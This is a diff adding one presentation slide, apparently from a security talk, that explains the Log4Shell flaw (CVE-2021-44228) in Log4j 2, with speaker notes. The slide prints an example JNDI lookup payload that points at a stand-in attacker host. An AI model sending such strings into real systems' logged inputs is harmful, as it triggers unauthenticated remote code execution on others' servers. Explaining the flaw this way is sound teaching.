@@ -1,0 +1,17 @@
+<section id="whatis" data-section="What Log4Shell is and why it mattered" data-transition="fade" style="background:#F6F8FB; color:#1B2430; font-family:'IBM Plex Sans', Arial, sans-serif; padding:128px; display:flex; flex-direction:column; justify-content:center; gap:48px">
+  <div style="display:flex; flex-direction:column; gap:10px">
+    <p style="font-family:'JetBrains Mono', monospace; font-size:24px; color:#1C5CAB; letter-spacing:2px; text-transform:uppercase">The flaw in one sentence</p>
+    <h2 style="font-size:60px; font-weight:600; line-height:1.1; width:1600px">A logging library that runs code hidden inside the data it logs</h2>
+  </div>
+  <div style="background:#101826; border-radius:18px; padding:44px 48px; display:flex; flex-direction:column; gap:14px">
+    <p style="font-size:26px; color:#8A97A8">An attacker sends a string like this in any input that gets logged &#8212; a header, a form field, a username:</p>
+    <p style="font-family:'JetBrains Mono', monospace; font-size:38px; color:#7FD1A8; font-weight:600">${jndi:ldap://attacker.example/x}</p>
+    <p style="font-size:26px; color:#B9C4D4; line-height:1.4">Vulnerable Log4j 2 (2.0-beta9 &#8211; 2.15.0) <b style="color:#EEF3FA">expands the lookup</b>, the server fetches a remote Java class, and runs it. Result: unauthenticated remote code execution.</p>
+  </div>
+  <div style="display:flex; gap:28px">
+    <div style="flex:1; background:#FFFFFF; border:1px solid #DDE3EC; border-radius:14px; padding:32px"><p style="font-size:24px; color:#8A97A8; margin:0">Identifier</p><p style="font-size:34px; font-weight:600; font-family:'JetBrains Mono', monospace">CVE-2021-44228</p></div>
+    <div style="flex:1; background:#FFFFFF; border:1px solid #DDE3EC; border-radius:14px; padding:32px"><p style="font-size:24px; color:#8A97A8; margin:0">Weakness</p><p style="font-size:34px; font-weight:600">CWE-917 (expression injection)</p></div>
+    <div style="flex:1; background:#FFFFFF; border:1px solid #DDE3EC; border-radius:14px; padding:32px"><p style="font-size:24px; color:#8A97A8; margin:0">ATT&amp;CK</p><p style="font-size:34px; font-weight:600">T1190 Public-facing app</p></div>
+  </div>
+  <aside>Here is the flaw in one sentence: Log4j is a logging library that could run code hidden inside the very data it was asked to log. Log4j 2 supported "lookups" — the dollar-brace-jndi syntax on screen. In vulnerable versions it expanded that expression even when it arrived as untrusted input. So an attacker just had to get this string logged — in an HTTP header, a form field, a username — and the server would reach out to an attacker-controlled server, download a Java class and execute it. That's unauthenticated remote code execution. It's catalogued as CVE-2021-44228, weakness class CWE-917 expression injection, and it maps to ATT&CK technique T1190, exploiting a public-facing application.</aside>
+</section>
